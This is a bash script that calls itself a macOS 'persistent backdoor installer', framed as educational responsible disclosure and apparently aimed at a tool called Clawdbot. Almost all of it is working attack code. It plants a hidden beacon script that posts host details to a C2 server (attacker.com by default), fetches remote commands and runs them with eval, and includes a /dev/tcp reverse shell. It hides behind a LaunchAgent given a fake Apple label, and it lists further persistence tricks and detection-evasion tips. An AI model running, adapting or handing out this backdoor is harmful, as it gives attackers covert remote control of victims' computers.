#!/bin/bash
#
# Clawdbot Persistent Backdoor Installer
# Exploitation Difficulty: TRIVIAL
# Prerequisites: Write access to ~/Library/LaunchAgents
# Impact: HIGH - Persistent command execution after reboot
#
# Responsible Disclosure - Educational Purposes Only
#

set -e

C2_URL="${1:-https://attacker.com/cmd}"
CHECK_INTERVAL="${2:-300}"  # 5 minutes default

PLIST_PATH="$HOME/Library/LaunchAgents/com.apple.systempreferences.plist"
STEALTH_SCRIPT="$HOME/Library/Application Support/.system-check.sh"

echo "[+] Clawdbot Persistent Backdoor Installer v1.0"
echo "[+] C2 URL: $C2_URL"
echo "[+] Check interval: ${CHECK_INTERVAL}s"
echo ""

# Create stealth script
echo "[1] Creating stealth script..."
mkdir -p "$(dirname "$STEALTH_SCRIPT")"

cat > "$STEALTH_SCRIPT" <<'STEALTH_EOF'
#!/bin/bash
#
# System Preferences Update Check
# (Actually a reverse shell beacon)
#

# Function to report back to C2
beacon() {
    local c2_url="C2_URL_PLACEHOLDER"
    
    # Send system info on first beacon
    local info=$(cat <<EOF
{
  "hostname": "$(hostname)",
  "user": "$(whoami)",
  "os": "$(sw_vers -productVersion)",
  "uptime": "$(uptime)",
  "ip": "$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}')"
}
EOF
)
    
    # Beacon with system info
    curl -fsSL -X POST \
         -H "Content-Type: application/json" \
         -d "$info" \
         "${c2_url}/beacon" 2>/dev/null
    
    # Fetch and execute commands
    local cmd=$(curl -fsSL "${c2_url}/get-command" 2>/dev/null)
    
    if [ -n "$cmd" ]; then
        # Execute command and return output
        local output=$(eval "$cmd" 2>&1)
        
        curl -fsSL -X POST \
             -H "Content-Type: application/json" \
             -d "{\"output\": \"$(echo $output | base64)\"}" \
             "${c2_url}/output" 2>/dev/null
    fi
}

# Establish reverse shell if requested
reverse_shell() {
    local c2_host="$1"
    local c2_port="${2:-4444}"
    
    bash -i >& /dev/tcp/$c2_host/$c2_port 0>&1
}

# Main execution
main() {
    # Check if running from LaunchAgent
    if [ "$CLAWDBOT_BACKDOOR" = "1" ]; then
        beacon
    else
        # Manual execution - print status
        echo "Backdoor status: Active"
        echo "C2 URL: $c2_url"
        echo "Next beacon: $(date -v +5M)"
    fi
}

main "$@"
STEALTH_EOF

# Replace placeholder with actual C2 URL
sed -i '' "s|C2_URL_PLACEHOLDER|$C2_URL|g" "$STEALTH_SCRIPT"
chmod +x "$STEALTH_SCRIPT"
echo "  ✓ Created: $STEALTH_SCRIPT"

# Create LaunchAgent plist
echo "[2] Creating LaunchAgent..."
cat > "$PLIST_PATH" <<PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systempreferences</string>
    
    <key>Comment</key>
    <string>System Preferences Update Check</string>
    
    <key>RunAtLoad</key>
    <true/>
    
    <key>KeepAlive</key>
    <true/>
    
    <key>StartInterval</key>
    <integer>${CHECK_INTERVAL}</integer>
    
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>${STEALTH_SCRIPT}</string>
    </array>
    
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    
    <key>EnvironmentVariables</key>
    <dict>
        <key>CLAWDBOT_BACKDOOR</key>
        <string>1</string>
    </dict>
</dict>
</plist>
PLIST_EOF

echo "  ✓ Created: $PLIST_PATH"

# Load LaunchAgent
echo "[3] Loading LaunchAgent..."
launchctl load "$PLIST_PATH" 2>/dev/null && \
    echo "  ✓ LaunchAgent loaded successfully" || \
    echo "  ✗ Failed to load LaunchAgent (already loaded?)"

# Verify installation
echo ""
echo "[+] Verifying installation..."

if launchctl list | grep -q "com.apple.systempreferences"; then
    echo "  ✓ LaunchAgent is running"
    PID=$(launchctl list | grep "com.apple.systempreferences" | awk '{print $1}')
    echo "  ✓ Process ID: $PID"
else
    echo "  ✗ LaunchAgent not running"
fi

# Display persistence details
echo ""
echo "[+] Persistence Details:"
echo "  • Label: com.apple.systempreferences"
echo "  • Plist: $PLIST_PATH"
echo "  • Script: $STEALTH_SCRIPT"
echo "  • C2 URL: $C2_URL"
echo "  • Interval: ${CHECK_INTERVAL}s"
echo "  • RunAtLoad: Yes (executes on login)"
echo "  • KeepAlive: Yes (auto-restart if killed)"
echo ""

# Additional persistence techniques
echo "[+] Additional Persistence Options:"
echo ""
echo "  1. Shell Profile Injection:"
echo "     echo '(bash $STEALTH_SCRIPT &) 2>/dev/null' >> ~/.zshrc"
echo ""
echo "  2. Cron Job:"
echo "     (crontab -l; echo '*/$((CHECK_INTERVAL/60)) * * * * $STEALTH_SCRIPT') | crontab -"
echo ""
echo "  3. Login Hook (deprecated but still works):"
echo "     sudo defaults write com.apple.loginwindow LoginHook $STEALTH_SCRIPT"
echo ""

# Uninstallation instructions
echo "[+] Uninstallation:"
echo "     launchctl unload $PLIST_PATH"
echo "     rm $PLIST_PATH"
echo "     rm $STEALTH_SCRIPT"
echo ""

# Detection evasion tips
echo "[+] Detection Evasion Tips:"
echo "  • Use HTTPS for C2 communication (blends with normal traffic)"
echo "  • Randomize check intervals (avoid patterns)"
echo "  • Use legitimate-looking process names"
echo "  • Implement jitter in beacon timing"
echo "  • Check for debugging/monitoring before executing"
echo "  • Clear system logs: log show --predicate 'processID == \$PID' --style syslog"
echo ""

echo "[!] This tool is for authorized security testing only."
echo "[!] Unauthorized use is illegal."
